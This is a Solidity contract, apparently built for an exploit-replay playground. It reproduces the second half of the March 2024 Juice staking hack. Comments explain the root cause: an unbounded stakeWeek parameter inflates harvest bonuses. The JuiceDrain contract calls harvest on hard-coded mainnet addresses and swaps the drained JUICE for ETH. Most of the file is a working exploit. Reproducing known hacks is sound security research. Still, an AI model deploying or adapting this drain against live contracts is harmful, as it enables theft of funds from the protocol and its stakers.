// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

// Synthetic standalone exploit for the EVM Playground (2024-03-Juice).
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry test contract
// (attacker = address(this), no standalone exploit contract to deploy). This
// contract is a faithful, self-contained copy of that inline attack's SECOND
// HALF (harvest + JUICEtoETH) so the playground can deploy it and record run().
// The FIRST HALF (buy JUICE, approve, stake) runs unrecorded via the config's
// `setup.steps` instead of inside this contract — see the config comment for
// why: the exploit needs a real elapsed-time gap between stake() and harvest()
// for JuiceStaking's reward accrual to produce a nonzero `pending` (which the
// unbounded stakeWeek then multiplies into the drain), but a single recorded
// call runs at one fixed block/timestamp. Splitting stake into `setup` lets a
// `storeSlot` step rewind JuiceStaking's lastRewardUpdateTime by 12s in
// between, mirroring the test's `vm.roll(+1); vm.warp(+12);`. Logic and
// constants are copied verbatim from test/Juice_exp.sol.
//
// Root cause: JuiceStaking.stake(amount, stakeWeek) accepts an unbounded,
// user-controlled `stakeWeek` with only a `> 0` check. harvest() pays
// `pending + bonus` where `bonus = pending * (stakeWeek - 1) * 9 / 100` —
// an attacker staking with stakeWeek = 3,000,000,000 inflates the bonus to
// ~270,000,000x pending, draining the staking contract's JUICE reward vault.

interface IERC20 {
    function balanceOf(address owner) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
}

interface IStake {
    function harvest(uint256) external;
}

interface Uni_Router_V2 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract JuiceDrain {
    IERC20 constant JUICE = IERC20(0xdE5d2530A877871F6f0fc240b9fCE117246DaDae);
    IERC20 constant WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IStake constant JuiceStaking = IStake(0x8584DdbD1E28bCA4bc6Fb96baFe39f850301940e);

    Uni_Router_V2 constant Router = Uni_Router_V2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    // Mirrors the back half of testExploit(): harvest the (by now inflated)
    // bonus and dump it for ETH. The stake happened in setup, at a timestamp
    // this contract never sees directly.
    function run() external {
        JuiceStaking.harvest(0);
        JUICE.approve(address(Router), type(uint256).max);
        JUICEtoETH();
    }

    function JUICEtoETH() internal {
        address[] memory path = new address[](2);
        path[0] = address(JUICE);
        path[1] = address(WETH);
        Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            JUICE.balanceOf(address(this)), 0, path, address(this), block.timestamp + 60
        );
    }

    fallback() external payable {}
}
